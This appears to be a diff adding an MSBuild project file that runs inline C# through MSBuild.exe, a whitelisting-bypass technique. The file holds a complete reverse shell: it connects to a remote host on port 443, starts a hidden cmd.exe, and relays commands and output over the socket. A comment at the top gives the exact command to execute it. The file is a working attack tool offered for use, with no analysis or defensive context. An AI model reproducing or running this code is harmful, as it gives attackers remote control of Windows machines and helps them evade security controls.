@@ -1,0 +1,81 @@
+<!-- --
+To execute: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe XML_Simple_Rev_Shell.xml
+<!-- -->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+ <Target Name="Hello">
+ <ClassExample />
+ </Target>
+ <UsingTask
+ TaskName="ClassExample"
+ TaskFactory="CodeTaskFactory"
+ AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+ <Task>
+ 
+ <Code Type="Class" Language="cs">
+ <![CDATA[
+using System;
+using System.Runtime.InteropServices;
+using Microsoft.Build.Framework;
+using Microsoft.Build.Utilities;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+public class ClassExample :  Task, ITask
+{
+    static StreamWriter streamWriter;
+    public override bool Execute()
+    {
+        using(TcpClient client = new TcpClient("172.16.217.130", 443))
+        {
+            using(Stream stream = client.GetStream())
+            {
+                using(StreamReader rdr = new StreamReader(stream))
+                {
+                    streamWriter = new StreamWriter(stream);
+                    StringBuilder strInput = new StringBuilder();
+                    Process p = new Process();
+                    p.StartInfo.FileName = "cmd.exe";
+                    p.StartInfo.CreateNoWindow = true;
+                    p.StartInfo.UseShellExecute = false;
+                    p.StartInfo.RedirectStandardOutput = true;
+                    p.StartInfo.RedirectStandardInput = true;
+                    p.StartInfo.RedirectStandardError = true;
+                    p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                    p.Start();
+                    p.BeginOutputReadLine();
+                    while(true)
+                    {
+                        strInput.Append(rdr.ReadLine());
+                        //strInput.Append("\n");
+                        p.StandardInput.WriteLine(strInput);
+                        strInput.Remove(0, strInput.Length);
+                    }
+                    return true;
+                }
+            }
+        }
+    }
+    private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+    {
+        StringBuilder strOutput = new StringBuilder();
+        if (!String.IsNullOrEmpty(outLine.Data))
+        {
+            try
+            {
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            }
+            catch (Exception err) { }
+        }
+    }
+}
+ ]]>
+ </Code>
+ </Task>
+ </UsingTask>
+</Project>
